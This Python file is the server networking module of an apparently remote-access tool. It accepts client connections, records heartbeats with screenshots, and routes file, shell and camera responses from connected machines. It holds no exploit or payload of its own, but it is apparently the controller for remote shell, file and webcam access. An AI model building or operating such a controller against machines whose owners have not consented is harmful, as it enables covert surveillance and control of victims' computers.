import socket
import threading
import json
from PyQt5.QtWidgets import QMessageBox

HOST = '0.0.0.0'
BUFFER_SIZE = 1024 * 1024 * 8
SOCKET_TIMEOUT = 120
clients_lock = threading.Lock()

class ServerNetwork:
    def __init__(self, server_gui, port):
        self.server_gui = server_gui
        self.port = port
        self.server_socket = None
        self.server_thread = None
        self.running = False

    def receive_full_data(self, sock):
        data = b""
        while True:
            try:
                packet = sock.recv(BUFFER_SIZE)
                if not packet:
                    return None
                data += packet
                try:
                    json.loads(data.decode())
                    return data.decode()
                except json.JSONDecodeError:
                    continue
            except socket.timeout:
                return None
            except Exception as e:
                return None

    def handle_client(self, client_socket, addr):
        # Check if a client with the same IP already exists
        with clients_lock:
            for client_id, client in self.server_gui.clients.items():
                if client['addr'][0] == addr[0]:
                    client_socket.close()
                    return  # Ignore the new connection
        try:
            client_socket.settimeout(SOCKET_TIMEOUT)
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            while True:
                data = self.receive_full_data(client_socket)
                if not data:
                    break
                try:
                    message = json.loads(data)
                    if message['type'] == 'heartbeat':
                        client_info = message['data']
                        import uuid
                        client_id = client_info.get('client_id', str(uuid.uuid4()))
                        with clients_lock:
                            existing_client = next(
                                (cid for cid, client in self.server_gui.clients.items() if client['addr'] == addr),
                                None
                            )
                            if existing_client and existing_client != client_id:
                                self.server_gui.clients[existing_client]['socket'].close()
                                self.server_gui.client_manager.remove_client(existing_client)
                            self.server_gui.clients[client_id] = {
                                'socket': client_socket,
                                'info': client_info,
                                'addr': addr
                            }
                        if 'screenshot' in client_info:
                            self.server_gui.update_screenshot(client_id, client_info['screenshot'])
                        self.server_gui.client_manager.update_client_info(client_id, client_info, addr)
                    elif message['type'] == 'keepalive':
                        pass
                    elif message['type'] in ['file_response', 'shell_response', 'camera_response', 'response']:
                        client_id = next(
                            (cid for cid, client in self.server_gui.clients.items() if client['addr'] == addr),
                            None
                        )
                        if client_id:
                            self.server_gui.client_manager.handle_response(message, client_id)
                    elif message['type'] == 'error':
                        pass
                except json.JSONDecodeError:
                    continue
        except socket.timeout:
            pass
        except Exception as e:
            pass
        finally:
            client_id = next(
                (cid for cid, client in self.server_gui.clients.items() if client['addr'] == addr),
                None
            )
            if client_id:
                self.server_gui.client_manager.remove_client(client_id)
            client_socket.close()

    def start_server(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.server_socket.bind((HOST, self.port))
            self.server_socket.listen(5)
            self.running = True
        except Exception as e:
            QMessageBox.critical(self.server_gui, "Server Error", f"Failed to start server on port {self.port}: {e}")
            return

        def server_loop():
            while self.running:
                try:
                    client_socket, addr = self.server_socket.accept()
                    client_thread = threading.Thread(target=self.handle_client, args=(client_socket, addr))
                    client_thread.daemon = True
                    client_thread.start()
                except Exception:
                    pass

        self.server_thread = threading.Thread(target=server_loop)
        self.server_thread.daemon = True
        self.server_thread.start()

    def update_port(self, new_port):
        if new_port == self.port:
            return
        if self.running:
            self.running = False
            if self.server_socket:
                self.server_socket.close()
            if self.server_thread:
                self.server_thread.join(timeout=1.0)
        self.port = new_port
        self.start_server()